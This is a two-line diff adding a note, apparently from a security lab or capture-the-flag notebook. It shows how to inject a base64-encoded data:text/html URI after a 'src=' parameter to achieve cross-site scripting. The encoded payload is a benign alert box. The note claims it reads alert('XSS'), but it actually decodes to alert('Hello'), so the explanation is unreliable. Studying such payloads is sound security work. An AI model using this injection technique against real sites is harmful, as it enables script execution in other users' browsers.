@@ -1,0 +1,2 @@
+insert in URL after "src=" : data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
+it means “<script>alert(“XSS”)</script>” encoded in base64
